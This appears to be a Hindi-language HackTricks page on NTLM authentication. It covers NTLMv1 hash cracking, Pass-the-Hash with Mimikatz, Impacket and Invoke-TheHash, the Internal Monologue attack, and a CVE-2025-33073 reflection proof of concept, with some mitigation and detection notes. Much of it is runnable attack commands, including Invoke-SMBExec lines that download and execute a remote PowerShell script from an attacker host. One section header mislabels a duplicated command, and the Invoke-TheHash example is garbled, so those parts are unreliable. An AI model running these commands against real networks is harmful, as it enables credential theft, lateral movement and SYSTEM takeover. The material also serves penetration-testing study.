# NTLM

{{#include ../../banners/hacktricks-training.md}}


## बुनियादी जानकारी

जिन environments में **Windows XP और Server 2003** चल रहे हैं, वहाँ LM (Lan Manager) hashes का उपयोग किया जाता है, हालांकि यह व्यापक रूप से जाना जाता है कि इन्हें आसानी से compromise किया जा सकता है। एक विशेष LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, यह दर्शाता है कि LM का उपयोग नहीं किया जा रहा है; यह empty string का hash है।

डिफ़ॉल्ट रूप से, **Kerberos** authentication protocol प्राथमिक रूप से उपयोग किया जाता है। NTLM (NT LAN Manager) कुछ विशेष परिस्थितियों में काम आता है: Active Directory का न होना, domain का मौजूद न होना, गलत configuration के कारण Kerberos का काम न करना, या valid hostname के बजाय IP address का उपयोग करके connection करने की कोशिश करना।

Network packets में **"NTLMSSP"** header की मौजूदगी NTLM authentication process का संकेत देती है।

Authentication protocols - LM, NTLMv1 और NTLMv2 - के लिए support `%windir%\Windows\System32\msv1\_0.dll` में स्थित एक विशिष्ट DLL द्वारा प्रदान किया जाता है।

**मुख्य बिंदु**:

- LM hashes असुरक्षित हैं और empty LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) इसके उपयोग न होने को दर्शाता है।
- Kerberos डिफ़ॉल्ट authentication method है; NTLM का उपयोग केवल कुछ विशेष परिस्थितियों में होता है।
- NTLM authentication packets की पहचान "NTLMSSP" header से की जा सकती है।
- LM, NTLMv1 और NTLMv2 protocols को system file `msv1\_0.dll` support करती है।

## LM, NTLMv1 और NTLMv2

आप जाँच सकते हैं और configure कर सकते हैं कि कौन-सा protocol उपयोग किया जाएगा:

### GUI

_secpol.msc_ चलाएँ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level। इसके 6 levels होते हैं (0 से 5 तक)।

![LM, NTLMv1 और NTLMv2 - GUI: secpol.msc चलाएँ - Local policies - Security Options - Network Security: LAN Manager authentication level। इसके 6 levels होते हैं (0 से 5 तक)](<../../images/image (919).png>)

### Registry

इससे level 5 सेट होगा:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

संभावित मान:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## NTLM डोमेन प्रमाणीकरण की मूल योजना

1. **user** अपने **credentials** दर्ज करता है
2. Client machine **authentication request भेजती है**, जिसमें **domain name** और **username** भेजे जाते हैं
3. **server**, **challenge** भेजता है
4. **client**, **challenge** को password के hash को key के रूप में इस्तेमाल करके **encrypt करता है** और उसे response के रूप में भेजता है
5. **server**, **domain name, username, challenge और response** को **Domain controller** को भेजता है। अगर Active Directory कॉन्फ़िगर **नहीं है**, या domain name, server का नाम है, तो credentials की **स्थानीय रूप से जाँच की जाती है**।
6. **Domain controller जाँचता है कि सब कुछ सही है या नहीं** और जानकारी server को भेजता है

**server** और **Domain Controller**, **Netlogon** server के ज़रिए **Secure Channel** बना सकते हैं, क्योंकि Domain Controller को server का password पता होता है (यह **NTDS.DIT** db में होता है)।

### स्थानीय NTLM प्रमाणीकरण की योजना

प्रमाणीकरण **पहले बताई गई प्रक्रिया जैसा ही है, लेकिन** **server** को **SAM** file में authenticate करने की कोशिश कर रहे user का **hash** पता होता है। इसलिए, Domain Controller से पूछने के बजाय, **server खुद जाँचता है** कि user authenticate कर सकता है या नहीं।

### NTLMv1 Challenge

**challenge की लंबाई 8 bytes** और **response की लंबाई 24 bytes** होती है।

**NT hash (16bytes)** को **7bytes के 3 हिस्सों** में बाँटा जाता है (7B + 7B + (2B+0x00\*5)): **आखिरी हिस्से में zeros भरे जाते हैं**। फिर, **challenge** को हर हिस्से से अलग-अलग **cipher** किया जाता है और **cipher किए गए** bytes को **जोड़ दिया जाता है**। कुल: 8B + 8B + 8B = 24Bytes।

**समस्याएँ**:

- **Randomness** की कमी
- NT hash ढूँढने के लिए 3 हिस्सों पर अलग-अलग **हमला किया जा सकता है**
- **DES को crack किया जा सकता है**
- तीसरी key हमेशा **5 zeros** से बनी होती है।
- एक ही **challenge** दिए जाने पर **response** भी **एक जैसा** होगा। इसलिए, आप पीड़ित को "**1122334455667788**" string को **challenge** के रूप में दे सकते हैं और इस्तेमाल किए गए response पर **precomputed rainbow tables** से हमला कर सकते हैं।

### NTLMv1 attack

आधुनिक वातावरणों में Unconstrained delegation कम आम है, लेकिन पहुँच योग्य **Print Spooler service** का दुरुपयोग करके ऐसे host से authentication करवाया जा सकता है।

आपके पास AD में पहले से मौजूद कुछ credentials/sessions का दुरुपयोग करके **printer से अपने नियंत्रण वाले किसी host के विरुद्ध authenticate करवाने** का अनुरोध कर सकते हैं। फिर, `metasploit auxiliary/server/capture/smb` या `responder` का इस्तेमाल करके **authentication challenge को 1122334455667788 पर सेट** कर सकते हैं, authentication attempt capture कर सकते हैं, और अगर यह **NTLMv1** का इस्तेमाल करके किया गया था, तो आप इसे **crack कर पाएँगे**।\
अगर आप `responder` इस्तेमाल कर रहे हैं, तो authentication को **downgrade** करने की कोशिश के लिए **flag `--lm` का इस्तेमाल** कर सकते हैं।\
_ध्यान दें कि इस technique के लिए authentication, NTLMv1 का इस्तेमाल करके किया जाना चाहिए (NTLMv2 मान्य नहीं है)।_

याद रखें कि authentication के दौरान printer, computer account का इस्तेमाल करेगा, और computer accounts में **लंबे और random passwords** होते हैं, जिन्हें आम **dictionaries** से **शायद आप crack नहीं कर पाएँगे**। लेकिन **NTLMv1** authentication में **DES** का इस्तेमाल होता है ([यहाँ अधिक जानकारी](#ntlmv1-challenge)), इसलिए DES cracking के लिए खास तौर पर बनाई गई services का इस्तेमाल करके आप इसे crack कर पाएँगे (उदाहरण के लिए [https://crack.sh/](https://crack.sh) या [https://ntlmv1.com/](https://ntlmv1.com) का इस्तेमाल कर सकते हैं)।

### hashcat के साथ NTLMv1 attack

NTLMv1 पर [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi) से भी हमला किया जा सकता है। यह captured NTLMv1 messages को Hashcat के लिए उपयुक्त formats में बदलता है।<sup>[[1]](#references)</sup>

कमांड

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

नीचे दिया गया आउटपुट देगा:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

इस सामग्री वाली एक फ़ाइल बनाएँ:

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

hashcat चलाएँ (इसे hashtopolis जैसे टूल के ज़रिए distributed रूप में चलाना बेहतर है), क्योंकि अन्यथा इसमें कई दिन लगेंगे।

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

इस मामले में हमें पता है कि इसका पासवर्ड password है, इसलिए demo के लिए हम cheat करने वाले हैं:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

अब हमें cracked des keys को NTLM hash के हिस्सों में बदलने के लिए hashcat-utilities का उपयोग करना होगा:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

आख़िरकार, आख़िरी हिस्सा:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

उन्हें एक साथ मिलाएँ:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

**challenge की लंबाई 8 bytes है** और **2 responses भेजे जाते हैं**: एक की लंबाई **24 bytes** होती है और **दूसरे** की लंबाई **variable** होती है।

**पहला response**, **client और domain** से बनी **string** को **key** के रूप में **NT hash** के **MD4 hash** का उपयोग करके **HMAC_MD5** से cipher करके बनाया जाता है। फिर, **result** को **challenge** को **HMAC_MD5** से cipher करने के लिए **key** के रूप में इस्तेमाल किया जाएगा। इसमें **8 bytes का client challenge** जोड़ा जाएगा। कुल: 24 B।

**दूसरा response** **कई values** (एक नया client challenge, **replay attacks** से बचने के लिए **timestamp**...) का उपयोग करके बनाया जाता है।

अगर आपके पास **सफल authentication exchange वाला PCAP** है, तो domain, username, server challenge और NTLMv2 response निकालें, Hashcat के लिए capture को format करें और password recovery का प्रयास करने के लिए mode `5600` का उपयोग करें। संग्रहित practical walkthrough में packet-field निकालने की प्रक्रिया दी गई है, जबकि Hashcat के examples मौजूदा स्वीकृत format बताते हैं।<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Victim का hash मिल जाने पर**, आप इसका उपयोग उसकी **नकल करने** के लिए कर सकते हैं।\
आपको ऐसे **tool** का उपयोग करना होगा जो उस **hash का उपयोग करके NTLM authentication करेगा**, **या** आप एक नया **sessionlogon** बना सकते हैं और उस **hash को LSASS में inject** कर सकते हैं, ताकि जब भी कोई **NTLM authentication किया जाए**, उस **hash का उपयोग हो।** यही आखिरी विकल्प mimikatz करता है।

**याद रखें कि आप Computer accounts का उपयोग करके भी Pass-the-Hash attacks कर सकते हैं।**

### **Mimikatz**

**इसे administrator के रूप में चलाना आवश्यक है**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

यह वर्तमान local user के अंतर्गत एक process लॉन्च करता है, जबकि LSASS दिए गए credentials को उसके outbound network logon से जोड़ता है। इसके बाद आप plaintext password जाने बिना, दिए गए user के रूप में network resources तक पहुँच सकते हैं—`runas /netonly` की तरह।

### Pass-the-Hash from linux

आप Linux से Pass-the-Hash का इस्तेमाल करके Windows machines पर code execution प्राप्त कर सकते हैं।\
[**Pass-the-Hash execution के व्यावहारिक उदाहरण देखें।**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Impacket Windows compiled tools

आप [Windows के लिए impacket binaries यहाँ डाउनलोड कर सकते हैं](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)।

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (इस मामले में आपको एक command निर्दिष्ट करनी होगी; interactive shell प्राप्त करने के लिए cmd.exe और powershell.exe मान्य नहीं हैं)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- कई अन्य Impacket binaries भी उपलब्ध हैं...

### Invoke-TheHash

आप यहाँ से powershell scripts प्राप्त कर सकते हैं: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

यह फ़ंक्शन पिछले मोड्स को संयोजित करता है। आप **कई होस्ट** पास कर सकते हैं, चुने हुए टार्गेट्स को बाहर कर सकते हैं, और _SMBExec, WMIExec, SMBClient,_ या _SMBEnum_ चुन सकते हैं। यदि आप _**Command**_ पैरामीटर के बिना **SMBExec** या **WMIExec** चुनते हैं, तो यह केवल जाँचता है कि आपके पास पर्याप्त अनुमतियाँ हैं या नहीं।

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**इसे administrator के रूप में चलाना आवश्यक है**

यह टूल mimikatz जैसा ही काम करेगा (LSASS memory को modify करेगा)।

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### username और password के साथ Manual Windows remote execution


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows Host से credentials निकालना

अधिक जानकारी के लिए, [**Windows Credentials चुराना**](../stealing-credentials/README.md) देखें।

## Internal Monologue attack

Internal Monologue Attack एक stealthy credential extraction technique है, जो attacker को **LSASS process के साथ सीधे interaction किए बिना** victim की machine से NTLM hashes निकालने देती है। Mimikatz के विपरीत, जो memory से सीधे hashes पढ़ता है और जिसे अक्सर endpoint security solutions या Credential Guard द्वारा block कर दिया जाता है, यह attack **Security Support Provider Interface (SSPI) के ज़रिए NTLM authentication package (MSV1_0) को local calls** करके काम करता है। Attacker पहले **NTLM settings को downgrade** करता है (जैसे LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), ताकि NetNTLMv1 की अनुमति हो। फिर वह running processes से मिले मौजूदा user tokens का impersonation करता है और ज्ञात challenge का उपयोग करके NetNTLMv1 responses बनाने के लिए locally NTLM authentication trigger करता है।<sup>[[4]](#references)</sup>

इन NetNTLMv1 responses को capture करने के बाद, attacker **precomputed rainbow tables** का उपयोग करके मूल NTLM hashes को जल्दी से recover कर सकता है, जिससे lateral movement के लिए आगे Pass-the-Hash attacks करना संभव होता है। महत्वपूर्ण बात यह है कि Internal Monologue Attack stealthy रहता है, क्योंकि इससे network traffic उत्पन्न नहीं होता, code inject नहीं होता और सीधे memory dumps भी नहीं बनते। इसलिए, Mimikatz जैसी पारंपरिक methods की तुलना में defenders के लिए इसका पता लगाना मुश्किल होता है।

अगर enforced security policies के कारण NetNTLMv1 स्वीकार नहीं किया जाता, तो attacker NetNTLMv1 response निकालने में विफल हो सकता है।

इस स्थिति से निपटने के लिए Internal Monologue tool को update किया गया: NetNTLMv1 विफल होने पर भी **NetNTLMv2 responses capture करने** के लिए यह `AcceptSecurityContext()` का उपयोग करके dynamically server token प्राप्त करता है। NetNTLMv2 को crack करना बहुत मुश्किल है, लेकिन सीमित परिस्थितियों में यह relay attacks या offline brute-force का रास्ता खोल सकता है।

PoC **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** पर उपलब्ध है।<sup>[[4]](#references)</sup>

## NTLM Relay और Responder

**इन attacks को करने के तरीके की अधिक विस्तृत guide यहां पढ़ें:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Network capture से NTLM challenges parse करना

**आप** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **का उपयोग कर सकते हैं।**

## Serialized SPNs के ज़रिए NTLM और Kerberos *Reflection* (CVE-2025-33073)

Windows में कई mitigations हैं, जो उन *reflection* attacks को रोकने की कोशिश करते हैं जिनमें किसी host से शुरू हुई NTLM (या Kerberos) authentication को SYSTEM privileges पाने के लिए वापस उसी **host** पर relay किया जाता है।  

Microsoft ने MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) और बाद के patches के ज़रिए अधिकांश public chains को तोड़ दिया था। हालांकि, **CVE-2025-33073** दिखाता है कि *marshalled* (serialized) target-info वाले Service Principal Names (SPNs) को **SMB client किस तरह truncate करता है**, इसका दुरुपयोग करके protections को अब भी bypass किया जा सकता है।<sup>[[5]](#references)[[6]](#references)</sup>

### बग का TL;DR
1. Attacker एक **DNS A-record** register करता है, जिसका label marshalled SPN encode करता है – उदाहरण के लिए:
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Victim को उस hostname पर authenticate करने के लिए मजबूर किया जाता है (PetitPotam, DFSCoerce आदि)।
3. जब SMB client target string `cifs/srv11UWhRCAAAAA…` को `lsasrv!LsapCheckMarshalledTargetInfo` तक पहुंचाता है, तो `CredUnmarshalTargetInfo` की call serialized blob को **हटा देती है**, जिससे **`cifs/srv1`** बचता है।
4. अब `msv1_0!SspIsTargetLocalhost` (या Kerberos का equivalent) target को *localhost* मानता है, क्योंकि छोटा host part computer name (`SRV1`) से मेल खाता है।
5. परिणामस्वरूप, server `NTLMSSP_NEGOTIATE_LOCAL_CALL` set करता है और context में **LSASS का SYSTEM access-token** inject करता है (Kerberos के लिए SYSTEM-marked subsession key बनाई जाती है)।
6. `ntlmrelayx.py` **या** `krbrelayx.py` से उस authentication को relay करने पर उसी host पर पूरे SYSTEM rights मिल जाते हैं।<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### पैच और Mitigations
* **CVE-2025-33073** के लिए KB पैच `mrxsmb.sys::SmbCeCreateSrvCall` में एक जांच जोड़ता है, जो marshalled info वाले किसी भी SMB connection को ब्लॉक करती है (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* SMB relay destinations पर **SMB signing** लागू करें। अन्य destinations के लिए, उस protocol की अपनी signing या Extended Protection आवश्यकताओं और patch level का आकलन करें; केवल SMB signing से यह तय नहीं होता कि HTTPS WinRM relay संभव है या नहीं।
* `*<base64>...*` जैसे DNS records पर निगरानी रखें और coercion vectors (PetitPotam, DFSCoerce, AuthIP...) को ब्लॉक करें।

### पहचान संबंधी विचार
* ऐसे network captures जिनमें `NTLMSSP_NEGOTIATE_LOCAL_CALL` हो और client IP ≠ server IP।
* ऐसा Kerberos AP-REQ जिसमें subsession key हो और client principal, hostname के बराबर हो।
* Windows Event 4624/4648 में SYSTEM logons, जिनके तुरंत बाद उसी host से remote SMB writes हों।<sup>[[5]](#references)</sup>

एक serialized target-information DNS name, coerced authentication को हमलावर की ओर मोड़कर AD CS web-enrollment endpoint तक **cross-protocol relay** संभव कर सकता है। यह same-host reflection से अलग परिणाम है: [ESC8 enrollment की शर्तों](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), DNS-write rights, coercion path और target के patch level का स्वतंत्र रूप से आकलन किया जाना चाहिए।

**March 2026** के उस local reflection variant के लिए, जो `NT AUTHORITY\SYSTEM` तक पहुंचने के लिए **SMB arbitrary ports** और **TCP connection reuse** का दुरुपयोग करता है, देखें:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat के उदाहरण hashes – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: LSASS को छुए बिना NTLM Hashes प्राप्त करना](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection खत्म हो चुका है, NTLM Reflection अमर रहे!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [NTLMv2 Hash को crack करना – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
